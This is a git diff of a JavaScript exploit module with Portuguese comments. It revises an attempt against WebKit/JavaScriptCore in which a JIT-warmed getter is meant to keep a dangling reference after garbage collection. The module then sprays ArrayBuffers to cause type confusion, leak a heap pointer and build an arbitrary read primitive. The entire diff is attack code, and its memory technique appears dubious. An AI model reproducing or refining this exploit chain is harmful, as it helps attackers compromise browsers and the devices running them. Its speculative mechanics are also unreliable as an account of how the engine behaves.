@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R52 - Ajuste Fino de Tamanho e Spray)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R53 - JIT Reference Stashing)
 // =======================================================================================
-// ESTA VERSÃO TENTA CORRIGIR A FALHA DO R51.
-// - Aumenta drasticamente o número de objetos na pulverização de memória (heap spray).
-// - Ajusta o tamanho do objeto 'victim' e do 'ArrayBuffer' para uma correspondência mais precisa.
-// - Adiciona um log de depuração para entender melhor o tipo de dados em caso de falha.
+// ESTA VERSÃO ABANDONA A CRIAÇÃO SIMPLES DE ESCOPO E IMPLEMENTA UMA TÉCNICA MAIS
+// AVANÇADA PARA ENGANAR O GARBAGE COLLECTOR, USANDO O COMPILADOR JIT.
+// O objetivo é fazer o JIT armazenar em cache uma referência a um objeto, cortar a referência
+// explícita, forçar o GC e depois obter a referência pendurada do cache do JIT.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,9 +17,8 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R52_SizeTune";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R53_JIT_RefStash";
 
-// Função auxiliar para converter um AdvancedInt64 para um double (float64)
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
@@ -29,69 +28,77 @@ function int64ToDouble(int64) {
     return f64[0];
 }
 
-
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R52 - Ajuste Fino)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53 - JIT RefStash)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Ajuste Fino de Tamanho e Spray (R52) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: JIT Reference Stashing (R53) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
     let spray_buffers = [];
 
     try {
-        // FASE 1: Forçar Coleta de Lixo para limpar o estado do heap
-        logS3("--- FASE 1: Forçando Coleta de Lixo massiva (GC Triggering) ---", "subtest");
-        await triggerGC();
+        // FASE 1: Preparar o container e o victim para a manipulação do JIT
+        logS3("--- FASE 1: Preparando o container para o JIT ---", "subtest");
+        const container = {
+            victim_ref: null,
+            get_victim: function() { return this.victim_ref; }
+        };
 
-        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
-        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
-        dangling_ref = sprayAndCreateDanglingPointer();
-        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
-        
-        // FASE 3: Forçar Coleta de Lixo novamente para liberar a memória
-        await triggerGC();
-        logS3("    Memória do objeto-alvo liberada.", "info");
+        const victim = {
+            prop_a: 0x1111111111111111n, prop_b: 0x2222222222222222n, 
+            corrupted_prop: 0x3333333333333333n, p4: 0n, p5: 0n, p6: 0n, 
+            p7: 0n, p8: 0n, p9: 0n, p10: 0n, p11: 0n, p12: 0n, p13: 0n, p14: 0n, p15: 0n
+        };
+        container.victim_ref = victim;
 
-        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
-        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
-        // *** MUDANÇA R52: Aumentar drasticamente a pulverização ***
+        // FASE 2: Aquecer o método get_victim para forçar a otimização pelo JIT
+        logS3("--- FASE 2: Aquecendo o método get_victim para otimização JIT ---", "subtest");
+        for (let i = 0; i < 20000; i++) {
+            container.get_victim();
+        }
+        logS3("    Aquecimento do JIT concluído.", "info");
+
+        // FASE 3: Cortar a referência explícita e forçar a Coleta de Lixo
+        logS3("--- FASE 3: Cortando a referência e acionando o GC ---", "subtest");
+        container.victim_ref = null; // A única referência explícita foi removida
+        logS3("    Referência explícita removida. Acionando GC...", "info");
+        await triggerGC();
+        logS3("    GC acionado. A memória do victim deve ter sido liberada.", "warn");
+
+        // FASE 4: Obter a referência pendurada do código otimizado pelo JIT
+        logS3("--- FASE 4: Tentando obter a referência pendurada do JIT ---", "subtest");
+        dangling_ref = container.get_victim();
+
+        // FASE 5: Pulverizar a memória e verificar a confusão de tipos
+        logS3("--- FASE 5: Pulverizando ArrayBuffers e verificando a confusão ---", "subtest");
         for (let i = 0; i < 1024; i++) {
-            // *** MUDANÇA R52: Ajustar o tamanho para corresponder ao objeto 'victim' ***
             const buf = new ArrayBuffer(136); 
             const view = new BigUint64Array(buf);
-            view[0] = 0x4141414141414141n; // Marcador
+            view[0] = 0x4141414141414141n;
             view[1] = 0x4242424242424242n;
             spray_buffers.push(buf);
         }
-        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando a confusão de tipos...`, "info");
-
-        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
+        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
         
-        // *** MUDANÇA R52: Adicionar log de depuração ***
         logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
-
         if (typeof dangling_ref.corrupted_prop !== 'number') {
-            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
+            throw new Error("Falha no UAF via JIT. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
         }
         
-        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
+        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF/JIT OCORREU! ++++++++++++", "vuln");
 
         const leaked_ptr_double = dangling_ref.corrupted_prop;
         const buf_conv = new ArrayBuffer(8);
         (new Float64Array(buf_conv))[0] = leaked_ptr_double;
         const int_view = new Uint32Array(buf_conv);
         const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
-
-        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
+        logS3(`Ponteiro vazado através do UAF/JIT: ${leaked_addr.toString(true)}`, "leak");
         
-        // =======================================================================================
         // FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária
-        // =======================================================================================
         logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
-
         let corrupted_buffer = null;
         for (const buf of spray_buffers) {
             const view = new BigUint64Array(buf);
@@ -125,7 +132,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         final_result = { 
             success: true, 
-            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
+            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF/JIT!",
             leaked_addr: leaked_addr.toString(true),
             arb_read_test_value: toHex(read_value)
         };
@@ -161,26 +168,5 @@ async function triggerGC() {
     await PAUSE_S3(500);
 }
 
-function sprayAndCreateDanglingPointer() {
-    let dangling_ref_internal = null;
-
-    function createScope() {
-        // *** MUDANÇA R52: Ajustar o número de propriedades para corresponder ao tamanho de 136 bytes ***
-        // 15 propriedades * 8 bytes/BigInt = 120 bytes.
-        // Adicionando o cabeçalho JSCell (8 bytes) e ponteiro butterfly (8 bytes), o tamanho total do objeto é 136 bytes.
-        const victim = {
-            prop_a: 0x1111111111111111n,
-            prop_b: 0x2222222222222222n, 
-            corrupted_prop: 0x3333333333333333n, 
-            p4: 0n, p5: 0n, p6: 0n, p7: 0n, p8: 0n, p9: 0n, p10: 0n, p11: 0n, p12: 0n, p13: 0n, p14: 0n, p15: 0n
-        };
-        dangling_ref_internal = victim; 
-        
-        for(let i=0; i<100; i++) {
-            victim.prop_a += 1n;
-        }
-    }
-    
-    createScope();
-    return dangling_ref_internal;
-}
+// A função sprayAndCreateDanglingPointer não é mais necessária nesta abordagem,
+// pois a lógica foi movida para o corpo principal da função de teste.
